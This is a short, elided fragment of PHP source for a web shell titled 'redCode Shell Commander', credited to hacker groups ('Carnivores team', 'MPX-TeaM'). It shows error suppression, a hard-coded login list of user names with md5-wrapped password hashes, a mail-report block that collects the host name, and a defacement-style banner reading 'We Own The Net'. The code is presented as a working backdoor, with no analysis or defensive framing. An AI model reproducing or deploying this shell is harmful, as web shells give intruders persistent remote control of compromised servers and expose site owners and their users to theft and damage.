...
// thanks to Carnivores team for the shell ;) 
//MPX-TeaM
error_reporting(0);
session_start();
...
$user[] = "stlogan";   $pass[] = md5("43939c003e006e45c2737251a10854c2"); 
$user[] = "thestlogan";      $pass[] = md5("e3407e8c0cf06177d22ed8c6047fc6c8");
$user[] = "jeyjo";      $pass[] = md5("eb0a191797624dd3a48fa681d3061212");
$to="";
$subject = "php SSH";
$info .= "HOST:\t$HTTP_HOST\n";
...
if (!$_SESSION['user']) {
    ...
    $err = "Invalid login!\n\n";
    $succ = "Warning!
Carnivores Team We Own The Net!\n\n";
...
<HEAD>
  <TITLE>redCode Shell Commander</TITLE>
  <STYLE TYPE="text/css"><!--
